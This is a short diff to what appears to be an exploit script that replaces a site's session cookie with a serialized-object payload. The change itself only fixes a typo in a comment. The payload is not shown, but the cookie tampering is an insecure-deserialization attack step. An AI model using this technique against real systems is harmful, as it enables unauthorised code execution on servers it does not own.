@@ -24,7 +24,7 @@ def main():
     }
     r1 = s.post(uri, data=data)
 
-    # check the coookie for the serialized object and change the value to our payload above
+    # check the cookie for the serialized object and change the value to our payload above
     for cookie in s.cookies:
         if cookie.name == 'session':
             cookie.value = cookie_value 
